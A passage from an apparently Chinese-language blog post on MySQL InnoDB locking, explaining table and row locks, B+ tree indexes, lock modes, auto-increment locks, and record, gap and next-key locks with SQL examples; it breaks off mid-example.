&lt;p&gt;可以看到由于没有对 users 表加锁，在持有表锁的情况下是不能读取的，另外，由于加的是读锁，所以后面也不能对 orders 表进行更新。MySQL 表锁的加锁规则如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;对于读锁&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;持有读锁的会话可以读表，但不能写表；&lt;/li&gt;
&lt;li&gt;允许多个会话同时持有读锁；&lt;/li&gt;
&lt;li&gt;其他会话就算没有给表加读锁，也是可以读表的，但是不能写表；&lt;/li&gt;
&lt;li&gt;其他会话申请该表写锁时会阻塞，直到锁释放。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;对于写锁&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;持有写锁的会话既可以读表，也可以写表；&lt;/li&gt;
&lt;li&gt;只有持有写锁的会话才可以访问该表，其他会话访问该表会被阻塞，直到锁释放；&lt;/li&gt;
&lt;li&gt;其他会话无论申请该表的读锁或写锁，都会阻塞，直到锁释放。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;锁的释放规则如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;使用 UNLOCK TABLES 语句可以显示释放表锁；&lt;/li&gt;
&lt;li&gt;如果会话在持有表锁的情况下执行 LOCK TABLES 语句，将会释放该会话之前持有的锁；&lt;/li&gt;
&lt;li&gt;如果会话在持有表锁的情况下执行 START TRANSACTION 或 BEGIN 开启一个事务，将会释放该会话之前持有的锁；&lt;/li&gt;
&lt;li&gt;如果会话连接断开，将会释放该会话所有的锁。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;行锁&#34;&gt;行锁&lt;/h3&gt;

&lt;p&gt;表锁不仅实现和使用都很简单，而且占用的系统资源少，所以在很多存储引擎中使用，如 MyISAM、MEMORY、MERGE 等，MyISAM 存储引擎几乎完全依赖 MySQL 服务器提供的表锁机制，查询自动加表级读锁，更新自动加表级写锁，以此来解决可能的并发问题。但是表锁的粒度太粗，导致数据库的并发性能降低，为了提高数据库的并发能力，InnoDb 引入了行锁的概念。行锁和表锁对比如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;表锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低；&lt;/li&gt;
&lt;li&gt;行锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度最高。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;行锁和表锁一样，也分成两种类型：读锁和写锁。常见的增删改（INSERT、DELETE、UPDATE）语句会自动对操作的数据行加写锁，查询的时候也可以明确指定锁的类型，SELECT &amp;hellip; LOCK IN SHARE MODE 语句加的是读锁，SELECT &amp;hellip; FOR UPDATE 语句加的是写锁。&lt;/p&gt;

&lt;p&gt;行锁这个名字听起来像是这个锁加在某个数据行上，实际上这里要指出的是：&lt;strong&gt;在 MySQL 中，行锁是加在索引上的&lt;/strong&gt;。所以要深入了解行锁，还需要先了解下 MySQL 中索引的结构。&lt;/p&gt;

&lt;h4 id=&#34;mysql-的索引结构&#34;&gt;MySQL 的索引结构&lt;/h4&gt;

&lt;p&gt;我们知道，数据库中索引的作用是方便服务器根据用户条件快速查找数据库中的数据。在一堆有序的数据集中查找某条特定的记录，通常我们会使用&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95&#34;&gt;二分查找算法（Binary search）&lt;/a&gt;，使用该算法查询一组固定长度的数组数据是没问题的，但是如果数据集是动态增减的，使用扁平的数组结构就变得不那么方便了。所以，后来又发明了一种新的数据结构：&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%85%83%E6%90%9C%E5%B0%8B%E6%A8%B9&#34;&gt;二叉查找树（Binary search tree）&lt;/a&gt;，又叫做排序二叉树（Sorted binary tree），使用树形结构的好处是，可以大大的提高数据插入和删除的复杂度。二叉查找树查找算法的复杂度依赖于树的高度，为 O(log n)，譬如下面这样的一颗 3 层的二叉查找树，查找任意元素最多不超过 3 次比较就可以找到。
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;当然这是最理想的一种情况，我们考虑下最糟糕的一种情况，当数据本身就是有序的时候，生成的二叉树将会退化为线性表，复杂度就变成了 O(n)，如下图所示：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;为了解决这个问题，人们又想出了一种新的解决方法，那就是&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E5%B9%B3%E8%A1%A1%E6%A0%91&#34;&gt;平衡树（Balanced search tree）&lt;/a&gt;，其实平衡树有很多种，但是通常我们讨论的是 &lt;a href=&#34;https://zh.wikipedia.org/wiki/AVL%E6%A0%91&#34;&gt;AVL 树&lt;/a&gt;，这个名字来自于它的发明者：G.M. Adelson-Velsky 和 E.M. Landis。通过平衡树的 树旋转 操作，可以使得任何情况下二叉树的任意两个子树高度最大差为 1，也就是说让二叉树一直保持着矮矮胖胖的身材，这样保证对树的所有操作最坏复杂度都是 O(log n)。&lt;/p&gt;

&lt;p&gt;那这些树结构和 MySQL 的索引有什么关系呢？其实，无论是 InnoDb 还是 MyISAM 存储引擎，它们的索引采用的数据结构都是&lt;a href=&#34;https://zh.wikipedia.org/wiki/B%2B%E6%A0%91&#34;&gt;B+ 树&lt;/a&gt;，而 B+ 树又是从&lt;a href=&#34;https://zh.wikipedia.org/wiki/B%E6%A0%91&#34;&gt; B 树&lt;/a&gt;演变而来。二叉树虽然查找效率很高，但是也有着一些局限性，特别是当数据存储于外部设备时（如数据库或文件系统），因为这个时候不仅需要考虑算法本身的复杂度，还需要考虑程序与外部设备之间的读写效率。在二叉树中，每一个树节点只保存一条数据，并且最多有两个子节点。程序在查找数据时，读取一条数据，比较，再读取另一条数据，再比较，再读取，如此往复。每读取一次，都涉及到程序和外部设备之间的 IO 开销，而这个开销将大大降低程序的查找效率。于是，便有人提出了增加节点保存的数据条数的想法，譬如 &lt;a href=&#34;https://zh.wikipedia.org/wiki/2-3%E6%A0%91&#34;&gt;2-3 树&lt;/a&gt;（每个节点保存 1 条或 2 条数据）&lt;a href=&#34;https://zh.wikipedia.org/wiki/2-3-4%E6%A0%91&#34;&gt;、2-3-4 树&lt;/a&gt;（每个节点保存 1 条、2 条或 3 条数据）等，当然也不用限定得这么死，数值范围可以 1 - n 条，这就是 B 树。在实际应用中，会根据硬盘上一个 page 的大小来调整 n 的数值，这样可以让一次 IO 操作就读取到 n 条数据，减少了 IO 开销，并且，树的高度显著降低了，查找时只需几次 page 的 IO 即可定位到目标（page 翻译为中文为页，表示 InnoDB 每次从磁盘（data file）到内存（buffer pool）之间传送数据的大小）。一颗典型的 B 树如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;不过在现实场景里几乎没有地方在使用 B 树，这是因为 B 树没有很好的伸缩性，它将多条数据都保存在节点里，如果数据中某个字段太长，一个 page 能容纳的数据量将受到限制，最坏的情况是一个 page 保存一条数据，这个时候 B 树退化成二叉树；另外 B 树无法修改字段最大长度，除非调整 page 大小，重建整个数据库。于是，B+ 树横空出世，在 B+ 树里，内节点（非叶子节点）中不再保存数据，而只保存用于查找的 key，并且所有的叶子节点按顺序使用链表进行连接，这样可以大大的方便范围查询，只要先查到起始位置，然后按链表顺序查找，一直查到结束位置即可。如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;那么在 B+ 树中，数据保存在什么地方呢？关于这一点，InnoDb 和 MyISAM 的实现是不一样的，InnoDb 将数据保存在叶子节点中，而 MyISAM 将数据保存在独立的文件中，MyISAM 有三种类型的文件：*.frm 用于存储表的定义，*.MYI 用于存放表索引，*.MYD 用于存放数据。MYD 文件中的数据是以堆表的形式存储的，所以像 MyISAM 这样以堆形式存储数据的我们通常把它叫做 &lt;strong&gt;堆组织表（Heap organized table，简称 HOT）&lt;/strong&gt;，而像 InnoDb 这种将数据保存在叶子节点中，叫做 &lt;strong&gt;索引组织表（Index organized table，简称 IOT）&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;MyISAM 索引结构如下图所示：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;InnoDb 索引结构如下图所示：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/006.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到，MyISAM 索引的 B+ 树中，非叶子节点中保存 key，叶子节点中保存着数据的地址，指向数据文件中数据的位置；InnoDb 索引的 B+ 树中，非叶子节点和 MyISAM 一样保存 key，但是叶子节点直接保存数据。所以，MyISAM 在通过索引查找数据时，必须通过两步才能拿到数据（先获取数据的地址，再读取数据文件），InnoDb 在通过索引查找数据时，可以直接读取数据。&lt;/p&gt;

&lt;p&gt;注意上面两张图都是对应着 Primary Key 的情况，MySQL 有两种索引类型：主键索引（Primary Index）和非主键索引（Secondary Index，又称为二级索引、辅助索引），MyISAM 存储引擎对两种索引的存储没有区别，InnoDb 存储引擎的数据是保存在主键索引里的，非主键索引里保存着该节点对应的主键。所以 InnoDb 的主键索引有时候又被称为 聚簇索引（Clustered Index），二级索引被称为 非聚簇索引（Nonclustered Index）。如果没有主键，InnoDB 会试着使用一个非空的唯一索引（Unique nonnullable index）代替；如果没有这种索引，会定义一个隐藏的主键。所以 InnoDb 的表一定会有主键索引。关于聚簇索引和二级索引，可以参看这里的 &lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/innodb-index-types.html&#34;&gt;MySQL 文档&lt;/a&gt;。（疑惑：MyISAM 如果没有索引，会怎么样？会定义隐藏的主键吗？）&lt;/p&gt;

&lt;h4 id=&#34;mysql-加锁流程&#34;&gt;MySQL 加锁流程&lt;/h4&gt;

&lt;p&gt;关于 MySQL 的索引是一个很大的话题，譬如，增删改查时 B+ 树的调整算法是怎样实现的，如何通过索引加快 SQL 的执行速度，如何优化索引，等等等等。我们这里为了加强对锁的理解，只需要了解索引的数据结构即可。当执行下面的 SQL 时（id 为 students 表的主键），我们要知道，InnoDb 存储引擎会在 id = 49 这个主键索引上加一把 X 锁。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;  mysql&amp;gt; update students set score = 100 where id = 49;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当执行下面的 SQL 时（name 为 students 表的二级索引），InnoDb 存储引擎会在 name = &amp;lsquo;Tom&amp;rsquo; 这个索引上加一把 X 锁，同时会通过 name = &amp;lsquo;Tom&amp;rsquo; 这个二级索引定位到 id = 49 这个主键索引，并在 id = 49 这个主键索引上加一把 X 锁。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;  mysql&amp;gt; update students set score = 100 where name = &#39;Tom&#39;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;加锁过程如下图所示：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;像上面这样的 SQL 比较简单，只操作单条记录，如果要同时更新多条记录，加锁的过程又是什么样的呢？譬如下面的 SQL（假设 score 字段为二级索引）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;  mysql&amp;gt; update students set level = 3 where score &amp;gt;= 60;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下图展示了当用户执行这条 SQL 时，MySQL Server 和 InnoDb 之间的执行流程：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/008.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从图中可以看到当 UPDATE 语句被发给 MySQL 后，MySQL Server 会根据 WHERE 条件读取第一条满足条件的记录，然后 InnoDB 引擎会将第一条记录返回并加锁（current read），待 MySQL Server 收到这条加锁的记录之后，会再发起一个 UPDATE 请求，更新这条记录。一条记录操作完成，再读取下一条记录，直至没有满足条件的记录为止。因此，MySQL 在操作多条记录时 InnoDB 与 MySQL Server 的交互是一条一条进行的，加锁也是一条一条依次进行的，先对一条满足条件的记录加锁，返回给 MySQL Server，做一些 DML 操作，然后在读取下一条加锁，直至读取完毕。理解这一点，对我们后面分析复杂 SQL 语句的加锁过程将很有帮助。&lt;/p&gt;

&lt;h4 id=&#34;行锁种类&#34;&gt;行锁种类&lt;/h4&gt;

&lt;p&gt;根据锁的粒度可以把锁细分为表锁和行锁，行锁根据场景的不同又可以进一步细分，在 MySQL 的源码里，定义了四种类型的行锁，如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;#define LOCK_TABLE  16  /* table lock */
#define LOCK_REC    32  /* record lock */

/* Precise modes */
#define LOCK_ORDINARY   0   
#define LOCK_GAP    512
#define LOCK_REC_NOT_GAP 1024   
#define LOCK_INSERT_INTENTION 2048
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;LOCK_ORDINARY：也称为 &lt;strong&gt;Next-Key Lock&lt;/strong&gt;，锁一条记录及其之前的间隙，这是 RR 隔离级别用的最多的锁，从名字也能看出来；&lt;/li&gt;
&lt;li&gt;LOCK_GAP：间隙锁，锁两个记录之间的 GAP，防止记录插入；&lt;/li&gt;
&lt;li&gt;LOCK_REC_NOT_GAP：只锁记录；&lt;/li&gt;
&lt;li&gt;LOCK_INSERT_INTENSION：插入意向 GAP 锁，插入记录时使用，是 LOCK_GAP 的一种特例。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这四种行锁将是理解并解决数据库死锁的关键，我们下面将深入研究这四种锁的特点。但是在介绍这四种锁之前，让我们再来看下 MySQL 下锁的模式。&lt;/p&gt;

&lt;h2 id=&#34;读锁-vs-写锁&#34;&gt;读锁 vs. 写锁&lt;/h2&gt;

&lt;p&gt;MySQL 将锁分成两类：锁类型（lock_type）和锁模式（lock_mode）。锁类型就是上文中介绍的表锁和行锁两种类型，当然行锁还可以细分成记录锁和间隙锁等更细的类型，锁类型描述的锁的粒度，也可以说是把锁具体加在什么地方；而锁模式描述的是到底加的是什么锁，譬如读锁或写锁。锁模式通常是和锁类型结合使用的，锁模式在 MySQL 的源码中定义如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/* Basic lock modes */
enum lock_mode {
    LOCK_IS = 0, /* intention shared */
    LOCK_IX,    /* intention exclusive */
    LOCK_S,     /* shared */
    LOCK_X,     /* exclusive */
    LOCK_AUTO_INC,  /* locks the auto-inc counter of a table in an exclusive mode*/
    ...
};

&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;LOCK_IS：读意向锁；&lt;/li&gt;
&lt;li&gt;LOCK_IX：写意向锁；&lt;/li&gt;
&lt;li&gt;LOCK_S：读锁；&lt;/li&gt;
&lt;li&gt;LOCK_X：写锁；&lt;/li&gt;
&lt;li&gt;LOCK_AUTO_INC：自增锁；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;将锁分为读锁和写锁主要是为了提高读的并发，如果不区分读写锁，那么数据库将没办法并发读，并发性将大大降低。而 IS（读意向）、IX（写意向）只会应用在表锁上，方便表锁和行锁之间的冲突检测。LOCK_AUTO_INC 是一种特殊的表锁。下面依次进行介绍。&lt;/p&gt;

&lt;h3 id=&#34;读写锁&#34;&gt;读写锁&lt;/h3&gt;

&lt;p&gt;读锁和写锁都是最基本的锁模式，它们的概念也比较容易理解。读锁，又称共享锁（Share locks，简称 S 锁），加了读锁的记录，所有的事务都可以读取，但是不能修改，并且可同时有多个事务对记录加读锁。写锁，又称排他锁（Exclusive locks，简称 X 锁），或独占锁，对记录加了排他锁之后，只有拥有该锁的事务可以读取和修改，其他事务都不可以读取和修改，并且同一时间只能有一个事务加写锁。（注意：这里说的读都是当前读，快照读是无需加锁的，记录上无论有没有锁，都可以快照读）&lt;/p&gt;

&lt;p&gt;在其他的数据库系统中（譬如 MSSQL），我们可能还会看到一种基本的锁模式：更新锁（Update locks，简称 U 锁），MySQL 暂时不支持 U 锁，所以这里只是稍微了解一下。这个锁主要是用来防止死锁的，因为多数数据库在加 X 锁的时候是先获取 S 锁，获取成功之后再升级成 X 锁，如果有两个事务同时获取了 S 锁，然后又同时尝试升级 X 锁，就会发生死锁。增加 U 锁表示有事务对该行有更新意向，只允许一个事务拿到 U 锁，该事务在发生写后 U 锁变 X 锁，未写时看做 S 锁。（疑问：MySQL 更新的时候是直接申请 X 锁么？）&lt;/p&gt;

&lt;h3 id=&#34;读写意向锁&#34;&gt;读写意向锁&lt;/h3&gt;

&lt;p&gt;表锁锁定了整张表，而行锁是锁定表中的某条记录，它们俩锁定的范围有交集，因此表锁和行锁之间是有冲突的。譬如某个表有 10000 条记录，其中有一条记录加了 X 锁，如果这个时候系统需要对该表加表锁，为了判断是否能加这个表锁，系统需要遍历表中的所有 10000 条记录，看看是不是某条记录被加锁，如果有锁，则不允许加表锁，显然这是很低效的一种方法，为了方便检测表锁和行锁的冲突，从而引入了意向锁。&lt;/p&gt;

&lt;p&gt;意向锁为表级锁，也可分为读意向锁（IS 锁）和写意向锁（IX 锁）。当事务试图读或写某一条记录时，会先在表上加上意向锁，然后才在要操作的记录上加上读锁或写锁。这样判断表中是否有记录加锁就很简单了，只要看下表上是否有意向锁就行了。意向锁之间是不会产生冲突的，也不和 AUTO_INC 表锁冲突，它只会阻塞表级读锁或表级写锁，另外，意向锁也不会和行锁冲突，行锁只会和行锁冲突。&lt;/p&gt;

&lt;p&gt;下面是各个表锁之间的兼容矩阵：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/009.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这个矩阵看上去有点眼花缭乱，其实很简单，因为是斜对称的，所以我们用一条斜线把表格分割成两个部分，只需要看左下角的一半即可。总结起来有下面几点：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;意向锁之间互不冲突；&lt;/li&gt;
&lt;li&gt;S 锁只和 S/IS 锁兼容，和其他锁都冲突；&lt;/li&gt;
&lt;li&gt;X 锁和其他所有锁都冲突；&lt;/li&gt;
&lt;li&gt;AI 锁只和意向锁兼容；&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;auto-inc-锁&#34;&gt;AUTO_INC 锁&lt;/h3&gt;

&lt;p&gt;AUTO_INC 锁又叫自增锁（一般简写成 AI 锁），它是一种特殊类型的表锁，当插入的表中有自增列（AUTO_INCREMENT）的时候可能会遇到。当插入表中有自增列时，数据库需要自动生成自增值，在生成之前，它会先为该表加 AUTO_INC 表锁，其他事务的插入操作阻塞，这样保证生成的自增值肯定是唯一的。AUTO_INC 锁具有如下特点：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AUTO_INC 锁互不兼容，也就是说同一张表同时只允许有一个自增锁；&lt;/li&gt;
&lt;li&gt;自增锁不遵循二段锁协议，它并不是事务结束时释放，而是在 INSERT 语句执行结束时释放，这样可以提高并发插入的性能。&lt;/li&gt;
&lt;li&gt;自增值一旦分配了就会 +1，如果事务回滚，自增值也不会减回去，所以自增值可能会出现中断的情况。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;显然，AUTO_INC 表锁会导致并发插入的效率降低，为了提高插入的并发性，MySQL 从 5.1.22 版本开始，引入了一种可选的轻量级锁（mutex）机制来代替 AUTO_INC 锁，我们可以通过参数 &lt;code&gt;innodb_autoinc_lock_mode&lt;/code&gt; 控制分配自增值时的并发策略。参数 &lt;code&gt;innodb_autoinc_lock_mode&lt;/code&gt; 可以取下列值：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;innodb_autoinc_lock_mode = 0 （traditional lock mode）&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;使用传统的 AUTO_INC 表锁，并发性比较差。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;innodb_autoinc_lock_mode = 1 （consecutive lock mode）&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;MySQL 默认采用这种方式，是一种比较折中的方法。&lt;/li&gt;
&lt;li&gt;MySQL 将插入语句分成三类：Simple inserts、Bulk inserts、Mixed-mode inserts。通过分析 INSERT 语句可以明确知道插入数量的叫做 Simple inserts，譬如最经常使用的 INSERT INTO table VALUE(1,2) 或 INSERT INTO table VALUES(1,2), (3,4)；通过分析 INSERT 语句无法确定插入数量的叫做 Bulk inserts，譬如 INSERT INTO table SELECT 或 LOAD DATA 等；还有一种是不确定是否需要分配自增值的，譬如 INSERT INTO table VALUES(1,&amp;lsquo;a&amp;rsquo;), (NULL,&amp;lsquo;b&amp;rsquo;), (5, &amp;lsquo;C&amp;rsquo;), (NULL, &amp;rsquo;d&amp;rsquo;) 或 INSERT &amp;hellip; ON DUPLICATE KEY UPDATE，这种叫做 Mixed-mode inserts。&lt;/li&gt;
&lt;li&gt;Bulk inserts 不能确定插入数使用表锁；Simple inserts 和 Mixed-mode inserts 使用轻量级锁 mutex，只锁住预分配自增值的过程，不锁整张表。Mixed-mode inserts 会直接分析语句，获得最坏情况下需要插入的数量，一次性分配足够的自增值，缺点是会分配过多，导致浪费和空洞。&lt;/li&gt;
&lt;li&gt;这种模式的好处是既平衡了并发性，又能保证同一条 INSERT 语句分配的自增值是连续的。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;innodb_autoinc_lock_mode = 2 （interleaved lock mode）&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;全部都用轻量级锁 mutex，并发性能最高，按顺序依次分配自增值，不会预分配。&lt;/li&gt;
&lt;li&gt;缺点是不能保证同一条 INSERT 语句内的自增值是连续的，这样在复制（replication）时，如果 binlog_format 为 statement-based（基于语句的复制）就会存在问题，因为是来一个分配一个，同一条 INSERT 语句内获得的自增值可能不连续，主从数据集会出现数据不一致。所以在做数据库同步时要特别注意这个配置。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可以参考 MySQL 的这篇文档 &lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/innodb-auto-increment-handling.html&#34;&gt;AUTO_INCREMENT Handling in InnoDB&lt;/a&gt; 了解自增锁，InnoDb 处理自增值的方式，以及在不同的复制模式下可能遇到的问题。&lt;/p&gt;

&lt;h2 id=&#34;细说-mysql-锁类型&#34;&gt;细说 MySQL 锁类型&lt;/h2&gt;

&lt;p&gt;前面在讲行锁时有提到，在 MySQL 的源码中定义了四种类型的行锁，我们这一节将学习这四种锁。在我刚接触数据库锁的概念时，我理解的行锁就是将锁锁在行上，这一行记录不能被其他人修改，这种理解其实很肤浅，因为行锁也有可能并不是锁在行上而是行与行之间的间隙上，事实上，我理解的这种锁是最简单的行锁模式：记录锁。&lt;/p&gt;

&lt;h3 id=&#34;记录锁-record-locks&#34;&gt;记录锁（Record Locks）&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/innodb-locking.html#innodb-record-locks&#34;&gt;记录锁&lt;/a&gt; 是最简单的行锁，并没有什么好说的。譬如下面的 SQL 语句（id 为主键）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; UPDATE accounts SET level = 100 WHERE id = 5;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这条 SQL 语句就会在 id = 5 这条记录上加上记录锁，防止其他事务对 id = 5 这条记录进行修改或删除。记录锁永远都是加在索引上的，就算一个表没有建索引，数据库也会隐式的创建一个索引。如果 WHERE 条件中指定的列是个二级索引，那么记录锁不仅会加在这个二级索引上，还会加在这个二级索引所对应的聚簇索引上（参考上面的加锁流程一节）。&lt;/p&gt;

&lt;p&gt;注意，如果 SQL 语句无法使用索引时会走主索引实现全表扫描，这个时候 MySQL 会给整张表的所有数据行加记录锁。如果一个 WHERE 条件无法通过索引快速过滤，存储引擎层面就会将所有记录加锁后返回，再由 MySQL Server 层进行过滤。不过在实际使用过程中，MySQL 做了一些改进，在 MySQL Server 层进行过滤的时候，如果发现不满足，会调用 unlock_row 方法，把不满足条件的记录释放锁（显然这违背了二段锁协议）。这样做，保证了最后只会持有满足条件记录上的锁，但是每条记录的加锁操作还是不能省略的。可见在没有索引时，不仅会消耗大量的锁资源，增加数据库的开销，而且极大的降低了数据库的并发性能，所以说，更新操作一定要记得走索引。&lt;/p&gt;

&lt;h3 id=&#34;间隙锁-gap-locks&#34;&gt;间隙锁（Gap Locks）&lt;/h3&gt;

&lt;p&gt;还是看上面的那个例子，如果 id = 5 这条记录不存在，这个 SQL 语句还会加锁吗？答案是可能有，这取决于数据库的隔离级别。&lt;/p&gt;

&lt;p&gt;还记得我们在上一篇博客中介绍的数据库并发过程中可能存在的问题吗？其中有一个问题叫做 &lt;strong&gt;幻读&lt;/strong&gt;，指的是在同一个事务中同一条 SQL 语句连续两次读取出来的结果集不一样。在 read committed 隔离级别很明显存在幻读问题，在 repeatable read 级别下，标准的 SQL 规范中也是存在幻读问题的，但是在 MySQL 的实现中，使用了间隙锁的技术避免了幻读。&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/innodb-locking.html#innodb-gap-locks&#34;&gt;间隙锁&lt;/a&gt; 是一种加在两个索引之间的锁，或者加在第一个索引之前，或最后一个索引之后的间隙。有时候又称为范围锁（Range Locks），这个范围可以跨一个索引记录，多个索引记录，甚至是空的。使用间隙锁可以防止其他事务在这个范围内插入或修改记录，保证两次读取这个范围内的记录不会变，从而不会出现幻读现象。很显然，间隙锁会增加数据库的开销，虽然解决了幻读问题，但是数据库的并发性一样受到了影响，所以在选择数据库的隔离级别时，要注意权衡性能和并发性，根据实际情况考虑是否需要使用间隙锁，大多数情况下使用 read committed 隔离级别就足够了，对很多应用程序来说，幻读也不是什么大问题。&lt;/p&gt;

&lt;p&gt;回到这个例子，这个 SQL 语句在 RC 隔离级别不会加任何锁，在 RR 隔离级别会在 id = 5 前后两个索引之间加上间隙锁。&lt;/p&gt;

&lt;p&gt;值得注意的是，间隙锁和间隙锁之间是互不冲突的，间隙锁唯一的作用就是为了防止其他事务的插入，所以加间隙 S 锁和加间隙 X 锁没有任何区别。&lt;/p&gt;

&lt;h3 id=&#34;next-key-locks&#34;&gt;Next-Key Locks&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/innodb-locking.html#innodb-next-key-locks&#34;&gt;Next-key 锁&lt;/a&gt; 是记录锁和间隙锁的组合，它指的是加在某条记录以及这条记录前面间隙上的锁。假设一个索引包含
10、11、13 和 20 这几个值，可能的 Next-key 锁如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;(-∞, 10]&lt;/li&gt;
&lt;li&gt;(10, 11]&lt;/li&gt;
&lt;li&gt;(11, 13]&lt;/li&gt;
&lt;li&gt;(13, 20]&lt;/li&gt;
&lt;li&gt;(20, +∞)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;通常我们都用这种左开右闭区间来表示 Next-key 锁，其中，圆括号表示不包含该记录，方括号表示包含该记录。前面四个都是 Next-key 锁，最后一个为间隙锁。和间隙锁一样，在 RC 隔离级别下没有 Next-key 锁，只有 RR 隔离级别才有。继续拿上面的 SQL 例子来说，如果 id 不是主键，而是二级索引，且不是唯一索引，那么这个 SQL 在 RR 隔离级别下会加什么锁呢？答案就是 Next-key 锁，如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;(a, 5]&lt;/li&gt;
&lt;li&gt;(5, b)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中，a 和 b 是 id = 5 前后两个索引，我们假设 a = 1、b = 10，那么此时如果插入一条 id = 3 的记录将会阻塞住。之所以要把 id = 5 前后的间隙都锁住，仍然是为了解决幻读问题，因为 id 是非唯一索引，所以 id = 5 可能会有多条记录，为了防止再插入一条 id = 5 的记录，必须将下面标记 ^ 的位置都锁住，因为这些位置都可能再插入一条 id = 5 的记录：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1 ^ 5 ^ 5 ^ 5 ^ 10 11 13 15
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出来，Next-key 锁确实可以避免幻读，但是带来的副作用是连插入 id = 3 这样的记录也被阻塞了，这根本就不会引起幻读问题的。&lt;/p&gt;

&lt;p&gt;关于 Next-key 锁，有一个比较有意思的问题，比如下面这个 orders 表（id 为主键，order_id 为二级非唯一索引）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;+-----+----------+
|  id | order_id |
+-----+----------+
|   1 |        1 |
|   3 |        2 |
|   5 |        5 |
|   7 |        5 |
|  10 |        9 |
+-----+----------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;事务 A 执行下面的 SQL：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
mysql&amp;gt; select * from orders where order_id = 5 for update;
+-----+----------+
|  id | order_id |
+-----+----------+
|   5 |        5 |
|   7 |        5 |
+-----+----------+
2 rows in set (0.00 sec)
